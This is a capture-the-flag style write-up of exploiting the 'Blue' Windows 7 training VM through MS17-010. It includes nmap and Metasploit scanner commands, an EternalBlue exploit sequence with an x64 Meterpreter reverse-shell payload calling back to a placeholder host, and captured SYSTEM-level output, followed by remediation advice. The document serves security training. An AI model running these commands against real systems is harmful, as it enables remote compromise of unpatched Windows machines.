Blue

I investigated SMB exposure on an isolated Windows 7 VM and evaluated its MS17-010 attack surface.

Target environment

  • Target: Blue
  • Operating system: Windows 7 SP1
  • Architecture: x64 (64-bit)
  • Service / application: SMB on TCP/445
  • Weakness investigated: MS17-010
  • Scope: Intentionally vulnerable, isolated training VM

1. Enumerate and check SMB

My notes describe discovery on TCP/445 and checks for MS17-010, Microsoft’s update covering SMBv1 vulnerabilities. An open SMB port alone does not establish vulnerability. Blue is the target VM; Kali is the attacker.

Placeholders such as <TARGET_IP> stand in for lab addresses.

sudo nmap -p- -sC -sV -O -T4 <TARGET_IP> -oN blue_nmap.txt
nmap -Pn -p445 --script smb-vuln-ms17-010 <TARGET_IP>

# Metasploit scanner
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

A positive scanner result supports the vulnerability hypothesis; it does not demonstrate command execution.

Microsoft’s MS17-010 bulletin describes SMBv1 vulnerabilities permitting remote code execution through specially crafted messages; this is a network-service path, not a guessed login.

2. Match the payload architecture

My retained configuration screenshot shows the EternalBlue module and x64 Meterpreter payload (Metasploit’s interactive post-exploitation session). This command sequence reflects that configuration:

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <CALLBACK_IP>
set LPORT 4444
show options
check
exploit

The x64 payload matches the documented x64 target; callback reachability still has to be checked separately.

3. Verify the session

My capture records a successful overwrite and an opened Meterpreter session. getuid identified the session:

Captured output

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
OS: Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture: x64
Meterpreter: x64/windows

These are selected captured lines, with the machine name omitted. To verify from a native Windows shell:

# At the Meterpreter prompt
shell
# In the resulting Windows command shell
whoami
whoami /priv
hostname

4. Result and evidence limits

Result: SYSTEM access achieved

I obtained NT AUTHORITY\SYSTEM execution (Windows’ built in LocalSystem identity) on the isolated Windows 7 SP1 x64 VM using EternalBlue. The session already ran as SYSTEM, so this path did not need a separate privilege-escalation step.

The saved terminal confirms the module, payload, opened session and SYSTEM identity. That establishes execution as SYSTEM, not persistence, domain compromise or stable exploitation: the original notes also record a VM crash. No remediation retest is claimed.

5. Attack path

  1. SMB discovery
  2. MS17-010 checks
  3. x64 EternalBlue
  4. Meterpreter
  5. NT AUTHORITY\SYSTEM

6. Findings and remediation

Attack / finding

Vulnerable SMB service

The EternalBlue session reached SYSTEM on the isolated Windows 7 VM.

Recommended defensive action

Apply the MS17-010 security updates and migrate unsupported Windows systems to supported releases, then retest the service safely. No remediation or retest is claimed here.

Attack / finding

Legacy protocol exposure

The attack reached the target through its exposed SMB service.

Recommended defensive action

Disable SMBv1 where unnecessary and restrict SMB to required clients and network segments; reachability restrictions reduce exposure but do not replace patching.
